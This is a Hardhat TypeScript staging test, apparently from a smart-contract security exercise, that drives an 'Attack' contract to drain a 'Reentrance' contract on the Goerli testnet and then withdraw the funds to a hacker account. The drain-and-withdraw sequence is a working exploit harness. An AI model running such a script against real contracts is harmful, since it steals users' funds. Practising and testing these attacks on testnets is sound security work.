import { assert } from "chai"
import { network, ethers, getNamedAccounts} from "hardhat"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Reentrance, Attack } from "../../typechain-types"
import abi from "../../artifacts/contracts/Reentrance.sol/Reentrance.json"

const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 

developmentChains.includes(network.name)
    ? describe.skip
    : describe("Re-entrance hack staging", function () {
        let provider: any 
        let addressContract: string
        let hacker:any
        let reentrance:Reentrance
        let wallet:any
        let attack: Attack
        let amount:string

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            hacker = (await getNamedAccounts()).hacker
            
            addressContract = networkConfig[network.config.chainId!]["contractAddress"]!
            attack = await ethers.getContract("Attack",hacker)
            reentrance = new ethers.Contract(addressContract,abi.abi,wallet)
            
            amount = (await provider.getBalance(addressContract)).toString()
        })
        describe("Try Re-entrance", function () {
            it("Check the balance",async() => {
                let balance = (await provider.getBalance(addressContract)).toString()
                assert.equal(balance,amount)
            })        
            it("Start re-entrance", async() => {
                // Active attack()
                let tx = await attack.attack({value:amount, gasLimit:3000000})
                provider.waitForTransaction(tx.hash,6)
                // Check Reetrance contract balance
                let receipt = await provider.getTransactionReceipt(tx.hash)
                if(receipt !== null) {
                    let balance = (await provider.getBalance(addressContract)).toString()
                    assert.equal(balance,"0")
                }
                
                // Active withdraw()
                tx = await attack.withdraw()
                provider.waitForTransaction(tx.hash,9)
                
                // Check the Attack contract balance
                receipt = await provider.getTransactionReceipt(tx.hash)
                if(receipt !== null) {
                    let balance = (await provider.getBalance(attack.address))
                    assert.equal(balance.toNumber(),0)
                }
                
            })
        
        })
        
    })